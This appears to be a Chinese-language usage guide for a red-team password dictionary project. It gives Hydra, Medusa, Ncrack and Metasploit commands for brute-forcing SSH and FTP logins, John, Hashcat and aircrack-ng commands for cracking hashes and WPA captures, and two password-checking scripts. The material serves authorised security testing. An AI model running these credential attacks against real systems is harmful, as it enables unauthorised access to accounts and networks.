# 使用示例

本文档提供了使用中文密码字典的各种示例。

## 1. 使用 Hydra 进行 SSH 密码破解

```bash
# 使用小字典进行快速测试
hydra -l admin -P redteamnotes-chinese-passwords-100.txt ssh://target.com

# 使用中等大小字典
hydra -l admin -P redteamnotes-chinese-passwords-1000.txt ssh://target.com

# 使用大字典进行全面测试
hydra -l admin -P redteamnotes-chinese-passwords-10000.txt ssh://target.com

# 指定端口
hydra -l admin -P redteamnotes-chinese-passwords-1000.txt ssh://target.com:2222
```

## 2. 使用 John the Ripper

```bash
# 使用中文密码字典破解哈希
john --wordlist=redteamnotes-chinese-passwords-1000.txt hashfile.txt

# 使用拼音密码字典
john --wordlist=redteamnotes-chinese-passwords-pinyin.txt hashfile.txt

# 显示破解结果
john --show hashfile.txt
```

## 3. 使用 Hashcat

```bash
# MD5 哈希破解
hashcat -m 0 -a 0 hash.txt redteamnotes-chinese-passwords-1000.txt

# SHA1 哈希破解
hashcat -m 100 -a 0 hash.txt redteamnotes-chinese-passwords-1000.txt

# 使用拼音密码字典
hashcat -m 0 -a 0 hash.txt redteamnotes-chinese-passwords-pinyin.txt
```

## 4. 使用 Aircrack-ng 进行 WiFi 破解

```bash
# 使用中文密码字典破解 WPA/WPA2
aircrack-ng -w redteamnotes-chinese-passwords-1000.txt capture.cap

# 使用拼音密码字典
aircrack-ng -w redteamnotes-chinese-passwords-pinyin.txt capture.cap
```

## 5. 使用 Medusa

```bash
# SSH 密码破解
medusa -h target.com -U users.txt -P redteamnotes-chinese-passwords-1000.txt -M ssh

# FTP 密码破解
medusa -h target.com -U users.txt -P redteamnotes-chinese-passwords-1000.txt -M ftp
```

## 6. 使用 Ncrack

```bash
# SSH 密码破解
ncrack -U users.txt -P redteamnotes-chinese-passwords-1000.txt ssh://target.com

# 多服务破解
ncrack -U users.txt -P redteamnotes-chinese-passwords-1000.txt ssh://target.com ftp://target.com
```

## 7. 使用 Metasploit

```bash
# 在 Metasploit 中使用密码字典
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE redteamnotes-chinese-passwords-1000.txt
run
```

## 8. 密码强度检查脚本示例

```python
#!/usr/bin/env python3
import hashlib
import sys

def check_password_strength(password):
    """检查密码强度"""
    score = 0
    
    # 检查长度
    if len(password) >= 8:
        score += 1
    if len(password) >= 12:
        score += 1
    
    # 检查字符类型
    if any(c.isdigit() for c in password):
        score += 1
    if any(c.islower() for c in password):
        score += 1
    if any(c.isupper() for c in password):
        score += 1
    if any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?' for c in password):
        score += 1
    
    return score

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 check_password.py <password>")
        sys.exit(1)
    
    password = sys.argv[1]
    strength = check_password_strength(password)
    
    print(f"Password: {password}")
    print(f"Strength Score: {strength}/6")
    
    if strength <= 2:
        print("Status: Weak")
    elif strength <= 4:
        print("Status: Medium")
    else:
        print("Status: Strong")

if __name__ == "__main__":
    main()
```

## 9. 批量检查密码脚本

```bash
#!/bin/bash
# 批量检查密码是否在字典中

DICT_FILE="redteamnotes-chinese-passwords-1000.txt"
PASSWORD="test123"

if grep -Fxq "$PASSWORD" "$DICT_FILE"; then
    echo "Password '$PASSWORD' found in dictionary!"
    echo "This password is weak and should be changed."
else
    echo "Password '$PASSWORD' not found in dictionary."
    echo "This password is not in the common weak passwords list."
fi
```

## 注意事项

1. **合法使用**: 确保只在获得授权的系统上进行测试
2. **性能考虑**: 大字典文件会显著增加破解时间
3. **资源消耗**: 大字典会消耗更多内存和CPU资源
4. **网络影响**: 大量请求可能触发安全防护机制

## 推荐使用顺序

1. 首先使用小字典 (100-1000) 进行快速测试
2. 如果未找到密码，再使用中等字典 (10000)
3. 最后使用大字典 (100000+) 进行全面测试
4. 对于中文系统，优先使用拼音密码字典 